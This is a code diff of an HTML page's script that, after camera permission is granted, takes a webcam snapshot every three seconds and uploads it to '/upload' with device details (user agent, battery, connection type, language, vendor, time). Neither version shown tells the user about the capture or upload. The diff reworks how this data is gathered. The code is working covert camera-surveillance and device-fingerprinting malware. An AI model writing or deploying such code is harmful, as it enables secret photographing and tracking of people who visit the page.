@@ -25,9 +25,8 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    let deviceData = {
+    const deviceData = {
       userAgent: navigator.userAgent,
-      time: new Date().toLocaleString(),
       battery: 'unknown',
       connection: 'unknown',
       language: navigator.language || 'unknown',
@@ -36,42 +35,48 @@
       vendor: navigator.vendor || 'unknown'
     };
 
-    // Get battery info
-    if ('getBattery' in navigator) {
-      navigator.getBattery().then(b => {
-        deviceData.battery = Math.round(b.level * 100) + '%';
-      });
-    }
-
-    // Get connection info
-    if (navigator.connection) {
-      deviceData.connection = navigator.connection.effectiveType;
-    }
-
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        setInterval(() => {
-          if (video.videoWidth > 0 && video.videoHeight > 0) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+        if ('getBattery' in navigator) {
+          navigator.getBattery().then(battery => {
+            setInterval(() => {
+              deviceData.battery = Math.round(battery.level * 100) + '%';
+            }, 3000);
+          });
+        }
 
-            canvas.toBlob(blob => {
-              const formData = new FormData();
-              formData.append('image', blob, 'snapshot.png');
-              formData.append('metadata', JSON.stringify(deviceData));
+        setTimeout(() => {
+          setInterval(() => {
+            deviceData.time = new Date().toLocaleString();
 
-              fetch('/upload', {
-                method: 'POST',
-                body: formData
-              }).catch(err => console.error('Upload error:', err));
-            }, 'image/png');
-          }
-        }, 3000); // كل 3 ثواني
+            if (navigator.connection) {
+              deviceData.connection = navigator.connection.effectiveType;
+            }
+
+            if (video.videoWidth > 0) {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              ctx.drawImage(video, 0, 0);
+
+              canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('image', blob, 'snapshot.png');
+                formData.append('metadata', JSON.stringify(deviceData));
+
+                fetch('/upload', {
+                  method: 'POST',
+                  body: formData
+                }).catch(err => console.error('Upload error:', err));
+              }, 'image/png');
+            }
+          }, 3000);
+        }, 1000);
       })
-      .catch(err => console.error('Camera error:', err));
+      .catch(err => {
+        console.error('Camera error:', err);
+      });
   </script>
 </body>
 </html>
